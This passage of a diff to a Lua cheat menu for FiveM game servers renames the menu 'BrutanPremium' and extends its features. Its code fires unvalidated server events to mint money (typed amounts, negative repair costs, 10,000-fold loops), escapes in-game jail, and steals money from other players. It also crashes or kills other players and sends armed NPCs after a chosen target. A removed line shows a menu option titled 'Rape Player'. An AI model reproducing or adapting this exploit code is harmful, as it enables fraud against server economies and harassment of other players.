-				TriggerServerEvent('truckerJob:success',result)
+				TriggerServerEvent('truckerJob:success',result)-- 4x482
 				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
 				TriggerServerEvent('99kr-burglary:addMoney', result)
 				end
-			elseif Plane.Button("~g~Caution give back $") then
+			elseif BrutanPremium.Button("~g~Caution give back $") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 				TriggerServerEvent("esx_jobs:caution", "give_back", result)
 				end
-			elseif Plane.Button("~g~Truckerjob $") then
+			elseif BrutanPremium.Button("~g~Truckerjob $") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 				TriggerServerEvent('esx_truckerjob:pay', result)
 				end
-			elseif Plane.Button("~g~Admin give bank $") then
+			elseif BrutanPremium.Button("~g~Admin give bank $") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 				TriggerServerEvent('AdminMenu:giveBank', result)
 				end
-			elseif Plane.Button("~g~Admin give cash $") then
+			elseif BrutanPremium.Button("~g~Admin give cash $") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 				TriggerServerEvent('AdminMenu:giveCash', result)
 				end
-			elseif Plane.Button("~g~Postal job $") then
+			elseif BrutanPremium.Button("~g~Postal job $") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 					TriggerServerEvent("esx_gopostaljob:pay", result)
 				end
-			elseif Plane.Button("~g~Bank security $") then
+			elseif BrutanPremium.Button("~g~Bank security $") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 					TriggerServerEvent("esx_banksecurity:pay", result)
 				end
-			elseif Plane.Button("~g~Slotmachine $") then
+			elseif BrutanPremium.Button("~g~Slotmachine $") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 					TriggerServerEvent("esx_slotmachine:sv:2", result)
 				end
-			elseif Plane.Button("~g~ LScustoms $") then
+			elseif BrutanPremium.Button("~g~ LScustoms $") then
 				local result = KeyboardInput("Enter amount of money", "", 100)
 				if result then
 					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
 				end		
-			elseif Plane.Button("~g~Slotmachine(2) $") then
+			elseif BrutanPremium.Button("~g~Slotmachine(2) $") then
 				local result = KeyboardInput("Enter amount of money", "", 100)
 				if result then
 				TriggerServerEvent("vrp_slotmachine:server:2", result)
 				end
-			elseif Plane.Button("~g~Dirty money $") then
+			elseif BrutanPremium.Button("~g~Dirty money $") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
 				end
-			elseif Plane.Button("~g~Delivery $") then
+			elseif BrutanPremium.Button("~g~Delivery $") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 					TriggerServerEvent('delivery:success', result)
 				end
-			elseif Plane.Button("~g~Taxijob $") then
+			elseif BrutanPremium.Button("~g~Taxijob $") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 					TriggerServerEvent ('taxi:success', result)
 				end
-			elseif Plane.Button("~g~Pilot & Taxi (ESX) $") then
+			elseif BrutanPremium.Button("~g~Taxijob 10.000x $") then
+				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
+			elseif BrutanPremium.Button("~g~Pilot & Taxi (~g~ESX~s~) $") then
 					TriggerServerEvent('esx_pilot:success')
 					TriggerServerEvent('esx_taxijob:success')
 					TriggerServerEvent('esx_pilot:success')
@@ -5056,12 +7182,12 @@ Citizen.CreateThread(
 					TriggerServerEvent('esx_pilot:success')
 					TriggerServerEvent('esx_taxijob:success')
 					TriggerServerEvent('esx_pilot:success')
-			elseif Plane.Button("~g~Garbagejob $") then
+			elseif BrutanPremium.Button("~g~Garbagejob $") then
 				local result = KeyboardInput("Enter amount of money", "", 100000000)
 				if result then
 					TriggerServerEvent("esx_garbagejob:pay", result)
 				end	
-			elseif Plane.Button("~g~Paycheck $") then
+			elseif BrutanPremium.Button("~g~Paycheck $") then
 				TriggerServerEvent('paycheck:salary')
 				TriggerServerEvent('paycheck:salary')
 				TriggerServerEvent('paycheck:salary')
@@ -5072,16 +7198,40 @@ Citizen.CreateThread(
 				TriggerServerEvent('paycheck:salary')
 				end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("SelfMenu") then
-                if Plane.Button("Heal") then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("SelfMenu") then
+			if BrutanPremium.MenuButton("~r~→  ~s~Ped Menu", "PedMenu") then
+                                elseif BrutanPremium.Button("~g~Heal ~s~Yourself") then
                     SetEntityHealth(PlayerPedId(), 200)
-                elseif Plane.Button("Give Armor") then
+                elseif BrutanPremium.Button("Get Some ~b~Armor") then
                     SetPedArmour(PlayerPedId(), 200)
-                elseif Plane.Button("ESX Set Hunger/Thirst To 100%") then
+				elseif BrutanPremium.Button("Go Invisible") then
+				local model2 = GetHashKey("mp_m_niko_01")
+				local player2 = PlayerId()
+				local playerPed = GetPlayerPed(-1)
+				 RequestModel(model2)
+     while not HasModelLoaded(model2) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player2, model2)
+    SetModelAsNoLongerNeeded(model2)
+					elseif BrutanPremium.Button("Go Visible Again") then
+				local model3 = GetHashKey("mp_m_freemode_01")
+				local player3 = PlayerId()
+				local playerPed = GetPlayerPed(-1)
+				 RequestModel(model3)
+     while not HasModelLoaded(model3) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player3, model3)
+		SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model3)
+                elseif BrutanPremium.Button("~o~Food~s~ & ~b~Water ~s~100% (~g~ESX~s~)") then
                     TriggerEvent("esx_status:set", "hunger", 1000000)
                     TriggerEvent("esx_status:set", "thirst", 1000000)
-				elseif Plane.Button("Give yourself money (ESX)") then
+				elseif BrutanPremium.Button("Get Some $ ~g~(~g~ESX~s~)") then
 				TriggerServerEvent("esx_godirtyjob:pay", 500000)
 				TriggerServerEvent("esx_pizza:pay", 500000)
 				TriggerServerEvent("esx_slotmachine:sv:2", 500000)
@@ -5097,22 +7247,55 @@ Citizen.CreateThread(
 				TriggerServerEvent("esx_ranger:pay", 500000)
 				TriggerServerEvent("esx_truckersjob:payy", 500000)
 				PlaySoundFrontend(-1, "ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET", true)
-				drawNotification("Money deposited succesfully")
-				elseif Plane.Button("Taxijob ESX 10.000x") then
-				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
-				elseif Plane.Button("Give yourself money (VRP)") then
+				drawNotification("~g~KA-CHING $$")
+				elseif BrutanPremium.Button("Get some $ ~b~(VRP)") then
 				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
 				TriggerServerEvent('PayForRepairNow',-100000)
-				drawNotification("Money deposited succesfully")
-				elseif Plane.Button("Give yourself 10x salary (VRP)") then
-				a=1 repeat TriggerServerEvent('paycheck:salary') a=a+1 until (a>10)
-				a=1 repeat TriggerServerEvent('paycheck:bonus') a=a+1 until (a>10)
-                elseif Plane.Button("Revive") then
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				drawNotification("~g~KA-CHING $$")
+                elseif BrutanPremium.Button("Revive yourself (~g~ESX~s~)") then
                     TriggerEvent("esx_ambulancejob:revive")
 					TriggerEvent("ambulancier:selfRespawn")
-				elseif Plane.Button("~h~~b~Open Jail Menu ~g~ESX") then
+				elseif BrutanPremium.Button("Open Jail Menu (~g~ESX~s~)") then
 					TriggerEvent("esx-qalle-jail:openJailMenu")
-                elseif Plane.Button("ESX Get Out Of Jail") then
+                elseif BrutanPremium.Button("Get Out Of Jail (~g~ESX~s~)") then
                     local ped = PlayerPedId(-1)
                     TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                     TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
@@ -5121,44 +7304,44 @@ Citizen.CreateThread(
 					TriggerServerEvent("JailUpdate", 0)
 					TriggerEvent("UnJP")
                     TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
-                elseif Plane.Button("Suicide") then
+                elseif BrutanPremium.Button("~r~Kys") then
                     SetEntityHealth(PlayerPedId(), 0)
-                elseif  Plane.CheckBox(
-                    "God Mode",
+                elseif  BrutanPremium.CheckBox(
+                    "God-Mode",
                     godmode,
                     function(enabled)
                     godmode = enabled
                     end)
                 then
-				elseif  Plane.CheckBox(
-                    "Invisible",
-                    invisible,
+				elseif BrutanPremium.CheckBox(
+                    "~o~Nuke ~s~Punches",
+                    explosiveAmmo,
                     function(enabled)
-                    invisible = enabled
+                        explosiveAmmo = enabled
                     end)
                 then
-                elseif Plane.CheckBox(
-                    "Infinite Stamina",
+                elseif BrutanPremium.CheckBox(
+                    "Never Get Tired",
                     infStamina,
                     function(enabled)
                     infStamina = enabled
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Fast Run",
                     fastrun,
                     function(enabled)
                         fastrun = enabled
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Super Jump",
                     SuperJump,
                     function(enabled)
                         SuperJump = enabled
                     end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Noclip",
                     Noclip,
                     function(enabled)
@@ -5167,34 +7350,202 @@ Citizen.CreateThread(
                 then
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
+                BrutanPremium.Display()
+			elseif BrutanPremium.IsMenuOpened("PedMenu") then
+				if BrutanPremium.ComboBox("MalePed", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
+                    currentPedd = currentIndex
+                    selectedPedd = selectedIndex
+                end)
+                then
+				elseif BrutanPremium.ComboBox("FemalePed", peds3, currentPeddd, selectedPeddd, function(currentIndex, selectedIndex)
+                    currentPeddd = currentIndex
+                    selectedPeddd = selectedIndex
+                end)
+                then
+				elseif BrutanPremium.ComboBox("AnimalPed", peds4, currentPedddd, selectedPedddd, function(currentIndex, selectedIndex)
+                    currentPedddd = currentIndex
+                    selectedPedddd = selectedIndex
+                end)
+                then
+			elseif BrutanPremium.Button("Change To Selected ~b~Male") then
+					Deer.Destroy()
+		Wait(100)
+				local model1 = GetHashKey(peds2[selectedPedd])
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model1)
+    while not HasModelLoaded(model1) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model1)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model1)
+	elseif BrutanPremium.Button("Change To Selected ~p~Female") then
+		Deer.Destroy()
+		Wait(100)
+				local model5 = GetHashKey(peds3[selectedPeddd])
+				local player5 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model5)
+    while not HasModelLoaded(model5) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player5, model5)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model5)
+	elseif BrutanPremium.Button("Change To Selected ~y~Animal") then
+			Deer.Destroy()
+		Wait(100)
+				local model6 = GetHashKey(peds4[selectedPedddd])
+				local player6 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model6)
+    while not HasModelLoaded(model6) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player6, model6)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model6)
+		elseif BrutanPremium.Button("Spawn A ~y~Deer ~s~And Ride It") then
+     Deer.Create()
+	Citizen.Wait(150)
+	 Deer.Ride()
+				elseif BrutanPremium.Button("Change To FiveM Ped") then
+						Deer.Destroy()
+		Wait(100)
+				local model3 = GetHashKey("mp_m_freemode_01")
+				local player3 = PlayerId()
+				local playerPed = GetPlayerPed(-1)
+				 RequestModel(model3)
+     while not HasModelLoaded(model3) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player3, model3)
+	SetPedDefaultComponentVariation(GetPlayerPed(-1))
+    SetModelAsNoLongerNeeded(model3)
+	elseif BrutanPremium.Button("Change To ~y~Trevor") then
+			Deer.Destroy()
+		Wait(100)
+				local model13 = GetHashKey("player_two")
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model13)
+    while not HasModelLoaded(model13) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model13)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model1)
+	elseif BrutanPremium.Button("Change To ~b~Michael") then
+			Deer.Destroy()
+		Wait(100)
+				local model12 = GetHashKey("player_zero")
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model12)
+    while not HasModelLoaded(model12) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model12)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model12)
+	elseif BrutanPremium.Button("Change To ~g~Franklin") then
+			Deer.Destroy()
+		Wait(100)
+				local model11 = GetHashKey("player_one")
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model11)
+    while not HasModelLoaded(model11) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model11)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model11)
+	elseif BrutanPremium.Button("Change To ~r~Alien") then
+			Deer.Destroy()
+		Wait(100)
+				local model121 = GetHashKey("s_m_m_movalien_01")
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model121)
+    while not HasModelLoaded(model121) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model121)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model121)
+	elseif BrutanPremium.Button("Change To ~h~Bigfoot") then
+			Deer.Destroy()
+		Wait(100)
+				local model122 = GetHashKey("ig_orleans")
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model122)
+    while not HasModelLoaded(model122) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model122)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model122)
+	elseif BrutanPremium.Button("Change Clothes (~g~ESX~s~) (NOT TESTED)") then
+    TriggerEvent('esx_skin:openSaveableMenu')
+	end
+	BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("OnlinePlayersMenu") then
                     for i = 0, 128 do
-                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Plane.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), "PlayerOptionsMenu") then
+                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and BrutanPremium.MenuButton("~r~→  ~s~Name: "..GetPlayerName(i).." | ID: "..GetPlayerServerId(i).." | "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~Dead ~s~|" or "~g~Alive ~s~|"), "PlayerOptionsMenu") then
                             SelectedPlayer = i
                         end
                     end
 
-                    Plane.Display()
-				elseif Plane.IsMenuOpened("Credits") then
-				    if Plane.Button("∑~r~~h~Brutan#3927 - Owner") then
-				elseif Plane.Button("∑~o~~h~cr0#2154 - Owner") then
-				elseif Plane.Button("∑~y~~h~antonio#7777 - Developer") then
-				elseif Plane.Button("∑~g~~h~someone#6222 - Helping tons") then
-				elseif Plane.Button("∑~b~~h~woahh#5555 - Helping/testing tons") then
-				elseif Plane.Button("∑~p~~h~goliat#8888 - Developer") then
-				elseif Plane.Button("∑~h~BRUTAN Menu - Inspiration") then
-				end
-				Plane.Display()
-                elseif Plane.IsMenuOpened("PlayerOptionsMenu") then
-                    Plane.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
-                    if Plane.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("PlayerOptionsMenu") then
+                    BrutanPremium.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
+                    if BrutanPremium.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
                         SpectatePlayer(SelectedPlayer)
-					elseif Plane.Button("Rape Player") then
-					    rapeplayer()
-					elseif Plane.Button("Open inventory") then
+					elseif BrutanPremium.Button('~g~Heal ~s~Player') then
+                    local dU = 'PICKUP_HEALTH_STANDARD'
+                    local dV = GetHashKey(dU)
+                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                    CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
+                    SetPickupRegenerationTime(pickup, 60)
+                elseif BrutanPremium.Button('~b~Armour ~s~Player') then
+                    local dW = 'PICKUP_ARMOUR_STANDARD'
+                    local dX = GetHashKey(dW)
+                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                    local pickup = CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
+                    SetPickupRegenerationTime(pickup, 60)
+                elseif BrutanPremium.Button('~b~FULL Armour ~s~Player') then
+                    local dW = 'PICKUP_ARMOUR_STANDARD'
+                    local dX = GetHashKey(dW)
+                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                    for i = 0, 99 do
+                        Citizen.Wait(0)
+                        CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
+                        SetPickupRegenerationTime(pickup, 10)
+                        i = i + 1
+                    end
+					elseif BrutanPremium.Button("Open inventory") then
 					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
-					elseif Plane.Button("Teleport To Player With Vehicle") then
+					elseif BrutanPremium.Button("Teleport To Player With Vehicle") then
 										drawNotification(
                             'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                         )
@@ -5216,7 +7567,7 @@ Citizen.CreateThread(
                             '~h~~r~Operation cancelled~s~.'
                         )
                     end
-                    elseif Plane.Button("Teleport To Player") then
+                    elseif BrutanPremium.Button("Teleport To Player") then
 										drawNotification(
                             'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                         )
@@ -5238,29 +7589,29 @@ Citizen.CreateThread(
                             '~h~~r~Operation cancelled~s~.'
                         )
                     end
-					elseif Plane.Button("~g~Give ~w~Money") then
+					elseif BrutanPremium.Button("~g~Give ~w~Money") then
 						local result = KeyboardInput("Enter amount of money to give", "", 100000000)
 						if result then
 						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
 						end
-                    elseif Plane.Button("Crash Player") then
+                    elseif BrutanPremium.Button("Crash Player") then
                         CrashPlayer(GetPlayerPed(SelectedPlayer))
-                    elseif Plane.MenuButton("Troll Options", "PlayerTrollMenu") then
-                    elseif Plane.MenuButton("ESX Options", "PlayerESXMenu") then
-                    elseif Plane.MenuButton("Choose weapon", "SingleWepPlayer") then
-                    elseif Plane.Button("Give Ammo") then
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~Troll Options", "PlayerTrollMenu") then
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Options", "PlayerESXMenu") then
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~Choose weapon", "SingleWepPlayer") then
+                    elseif BrutanPremium.Button("Give Ammo") then
                         for i = 1, #allWeapons do
                             AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                         end
-                    elseif Plane.Button("Give All Weapons") then
+                    elseif BrutanPremium.Button("Give All Weapons") then
                         for i = 1, #allWeapons do
-                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
+                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, false)
                         end
-                    elseif Plane.Button("Remove All Weapons") then
+                    elseif BrutanPremium.Button("Remove All Weapons") then
                         for i = 1, #allWeapons do
                             RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                         end
-                    elseif Plane.Button("Give Vehicle") then
+                    elseif BrutanPremium.Button("Give Vehicle") then
                         local ped = GetPlayerPed(SelectedPlayer)
                         local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
 
@@ -5275,9 +7626,9 @@ Citizen.CreateThread(
                         else
                             drawNotification("~r~Model is not valid!")
                         end
-					elseif Plane.Button('Clone Car') then
+					elseif BrutanPremium.Button('Clone Car') then
                     ClonePedVeh()
-					elseif Plane.Button('Spawn Following Asshat') then
+					elseif BrutanPremium.Button('Spawn Following Asshat') then
                     Citizen.CreateThread(function()
                     asshat = true
                     local target = GetPlayerPed(SelectedPlayer)
@@ -5290,7 +7641,6 @@ Citizen.CreateThread(
                     local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
                     local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
                     local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    print("~")
                     if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
                         local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
                         NetworkRequestControlOfEntity(vt)
@@ -5303,13 +7653,11 @@ Citizen.CreateThread(
                     RequestModel(veh)
                     RequestModel('s_m_y_hwaycop_01')
                     while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
-                        print("~")
                         RequestModel('s_m_y_hwaycop_01')
                         Citizen.Wait(0)
                         RequestModel(veh)
                     end
                     if HasModelLoaded(veh) then
-                        print("~")
                         Citizen.Wait(50)
                         v =
                             CreateVehicle(
@@ -5324,8 +7672,8 @@ Citizen.CreateThread(
                         v1 =
                             CreateVehicle(
                             veh,
-                            pos.x - (xf * 10),
-                            pos.y - (yf * 10),
+                            pos.x - (xf * 10) + 2,
+                            pos.y - (yf * 10) + 2,
                             pos.z + 1,
                             GetEntityHeading(GetPlayerPed(-1)),
                             1,
@@ -5336,13 +7684,11 @@ Citizen.CreateThread(
                         SetEntityInvincible(v, true)
                         SetEntityInvincible(v1, true)
                         if DoesEntityExist(v) then
-                            print("~")
                             NetworkRequestControlOfEntity(v)
                             SetVehicleDoorsLocked(v, 4)
                             RequestModel('s_m_y_hwaycop_01')
                             Citizen.Wait(50)
                             if HasModelLoaded('s_m_y_hwaycop_01') then
-                                print("~")
                                 Citizen.Wait(50)
                                 local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
                                 local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
@@ -5350,17 +7696,14 @@ Citizen.CreateThread(
                                 local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
                                 assped = ped
                                 if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    print("~")
                                     GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                     GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                     GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                                     GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
-                                    print("~")
                                     SetPedIntoVehicle(ped, v, -1)
                                     SetPedIntoVehicle(ped1, v1, -1)
                                     SetPedIntoVehicle(pas, v, 0)
                                     SetPedIntoVehicle(pas1, v1, 0)
-                                    print("~")
                                     TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                                     asstarget = target
                                     TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
@@ -5373,56 +7716,64 @@ Citizen.CreateThread(
                         end
                     end
                 end)
-                    elseif Plane.Button("Kick From Vehicle") then
+                    elseif BrutanPremium.Button("Kick From Vehicle") then
                         ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                         drawNotification("~g~Kicked Player From Vehicle!")
-                    elseif Plane.Button("Delete Vehicle") then
-                        DelVeh(GetVehiclePedIsUsing(SelectedPlayer))
-                    elseif Plane.Button("Spawn Flare On Player") then
+					elseif BrutanPremium.Button("Kill Player") then
+					SetEntityHealth(GetPlayerPed(SelectedPlayer), 0)
+					SetEntityHealth(GetPlayerPedId(SelectedPlayer), 0)
+                    elseif BrutanPremium.Button("Spawn Flare On Player") then
                         local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                         ShootSingleBulletBetweenCoords(coords.x, coords.y , coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_FLAREGUN"), PlayerPedId(), true, true, 100)
-                    elseif Plane.Button("Spawn Smoke On Player") then
+                    elseif BrutanPremium.Button("Spawn Smoke On Player") then
                         local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                         ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z, 100, true, GetHashKey("WEAPON_SMOKEGRENADE"), GetPlayerPed(SelectedPlayer), true, true, 100)
                     end
 
-                    Plane.Display()
-                elseif Plane.IsMenuOpened("PlayerESXMenu") then
-                    if Plane.MenuButton("ESX Triggers", "PlayerESXTriggerMenu") then
-                    elseif Plane.MenuButton("ESX Jobs", "PlayerESXJobMenu") then
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("PlayerESXMenu") then
+                    if BrutanPremium.MenuButton("~r~→  ~s~ESX Triggers", "PlayerESXTriggerMenu") then
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Jobs", "PlayerESXJobMenu") then
                     end
 
-                    Plane.Display()
-                elseif Plane.IsMenuOpened("PlayerESXTriggerMenu") then
-                    if Plane.Button("ESX Revive") then
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("PlayerESXTriggerMenu") then
+                    if BrutanPremium.Button("ESX Revive") then
 					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
                     TriggerServerEvent("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer),GetPlayerServerId(selectedPlayer))
 					TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
 				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
 				    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))
+					local ax = GetPlayerPed(SelectedPlayer)
+                    local bK = GetEntityCoords(ax)
                     TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
+                    local dZ = {
+                        x = ESX.Math.Round(bK.x, 1),
+                        y = ESX.Math.Round(bK.y, 1),
+                        z = ESX.Math.Round(bK.z, 1)
+                    }
                     StopScreenEffect('DeathFailOut')
                     DoScreenFadeIn(800)
-					elseif Plane.Button("Fire player from job (ESX)") then
+					elseif BrutanPremium.Button("Fire player from job (~g~ESX~s~)") then
 				    FirePlayer(SelectedPlayer)
-                    elseif Plane.Button("ESX Give Money To Player From Your Wallet") then
+                    elseif BrutanPremium.Button("ESX Give Money To Player From Your Wallet") then
                         local d = KeyboardInput("Enter amount of money to give","",100)
                         if d ~= "" then
                             TriggerServerEvent("esx:giveInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                         end
-                    elseif Plane.Button("ESX Steal Money From Player") then
+                    elseif BrutanPremium.Button("ESX Steal Money From Player") then
